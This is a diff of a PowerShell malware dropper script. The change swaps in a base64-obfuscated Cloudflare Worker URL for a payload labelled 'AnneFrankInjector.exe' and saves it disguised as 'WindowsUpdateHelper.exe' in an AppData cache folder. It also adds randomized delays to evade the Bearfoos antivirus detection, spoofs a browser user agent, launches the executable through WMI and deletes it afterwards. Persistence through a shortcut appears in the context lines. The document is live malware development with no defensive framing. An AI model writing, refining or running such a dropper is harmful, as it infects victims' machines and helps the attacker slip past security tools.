@@ -49,22 +49,20 @@ if (-not (Test-Path $lnkPath)) {
     $shortcut.Save()
 }
 
-# === MAIN PAYLOAD: Download and execute with evasion ===
-Start-Sleep -Seconds (Get-Random -Min 2 -Max 8)
-Start-Sleep -Seconds (Get-Random -Min 20 -Max 30)
+# === BEARFOOS EVASION: Delay before EXE ===
+Start-Sleep -Seconds (Get-Random -Min 45 -Max 90)
 
+# === DOWNLOAD AND EXECUTE PAYLOAD ===
 $cache = "$env:APPDATA\Microsoft\Windows\Caches"
 if (-not (Test-Path $cache)) { New-Item -ItemType Directory -Path $cache -Force | Out-Null }
 
-# Base64-encoded URL (EXE)
-$exeUrl = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2FzdHJvLW9wZW5zb3VyY2UvY2xvdWQtc3luYy10b29scy9tYWluL2Fzc2V0cy9XaW5kb3dzVXBkYXRlSGVscGVyLmV4ZQ=='))
+# Base64-encoded Cloudflare Worker URL (AnneFrankInjector.exe)
+$exeUrl = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly9hZ2VkLW1vdW50YWluLTYxNGIubmF0YWxpYS1rdXNoODIud29ya2Vycy5kZXYvdXBkYXRl'))
 $exePath = "$cache\WindowsUpdateHelper.exe"
 
 $headers = @{'User-Agent' = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36'}
 
-Start-Sleep -Milliseconds (Get-Random -Min 1500 -Max 4000)
-
-# Download EXE (only if missing, with retry)
+# Download EXE with retry
 if (-not (Test-Path $exePath)) {
     $retryCount = 0
     $maxRetries = 3
@@ -78,10 +76,6 @@ if (-not (Test-Path $exePath)) {
         }
     } while ($retryCount -lt $maxRetries)
 }
-
-
-# Long delay before launching EXE
-Start-Sleep -Seconds (Get-Random -Min 45 -Max 90)
 
 # Launch EXE using WMI process creation
 if (Test-Path $exePath) {
@@ -101,7 +95,7 @@ if (Test-Path $exePath) {
     }
 }
 
-# Cleanup after 5 minutes
+# Cleanup EXE after 5 minutes
 Start-Job -ScriptBlock {
     param($exe)
     Start-Sleep -Seconds 300
